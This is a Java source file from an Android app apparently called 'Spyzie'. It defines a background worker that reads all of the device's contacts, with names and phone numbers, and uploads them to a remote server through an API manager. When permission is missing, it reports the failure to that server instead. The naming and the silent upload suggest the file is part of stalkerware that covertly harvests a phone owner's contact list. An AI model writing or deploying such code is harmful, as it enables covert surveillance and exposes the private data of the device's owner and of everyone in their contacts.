package com.tantd.spyzie.data.device.worker;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.tantd.spyzie.SpyzieApplication;
import com.tantd.spyzie.data.model.CommonResponse;
import com.tantd.spyzie.data.model.Contact;
import com.tantd.spyzie.data.model.Error;
import com.tantd.spyzie.data.network.ApiManager;
import com.tantd.spyzie.util.CommonUtils;
import com.tantd.spyzie.util.Constants;
import com.tantd.spyzie.util.rx.SchedulerProvider;

import java.util.ArrayList;
import java.util.List;

import javax.inject.Inject;

/**
 * Created by tantd on 2/26/2020.
 */
public class GetContactsWorker extends Worker {

    public static final String GET_CONTACTS_WORK_REQUEST = "GET_CONTACTS_WORK_REQUEST";

    @Inject
    ApiManager mApiManager;
    @Inject
    SchedulerProvider mSchedulerProvider;

    private static final String DEBUG_SUB_TAG = "[" + GetContactsWorker.class.getSimpleName() + "] ";

    public GetContactsWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        SpyzieApplication.getInstance().getServiceComponent().inject(this);

        if (CommonUtils.hasContactPermission(getApplicationContext())) {
            mApiManager.sendContactsData(getAllContacts()).subscribeOn(mSchedulerProvider.io())
                    .observeOn(mSchedulerProvider.ui())
                    .subscribe(commonResponse -> handleSendingSuccess(commonResponse),
                            error -> handleSendingError(error));

            return Result.success();
        } else {
            mApiManager.sendExceptionTracking(Error.HAS_NO_READ_CONTACTS_PERMISSION);
            return Result.failure();
        }
    }

    private void handleSendingSuccess(CommonResponse commonResponse) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "handleSendingSuccess, response=" + commonResponse);
        }
    }

    private void handleSendingError(Throwable error) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "handleSendingError: " + error);
        }
    }

    private List<Contact> getAllContacts() {
        List<Contact> contacts = new ArrayList<>();
        ContentResolver contentResolver = getApplicationContext().getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI
                , null, null, null, null);
        List<String> phone = null;
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                long id = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    phone = getPhoneNumber(contentResolver, id);
                }
                contacts.add(new Contact(id, name, phone));
            }
        }
        if (cursor != null) {
            cursor.close();
        }
        return contacts;
    }

    private List<String> getPhoneNumber(ContentResolver contentResolver, long id) {
        List<String> numbers = new ArrayList<>();
        Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI
                , null
                , ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?"
                , new String[]{String.valueOf(id)}, null);
        while (cursor.moveToNext()) {
            String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            numbers.add(phoneNumber);
        }
        cursor.close();
        return numbers;
    }
}
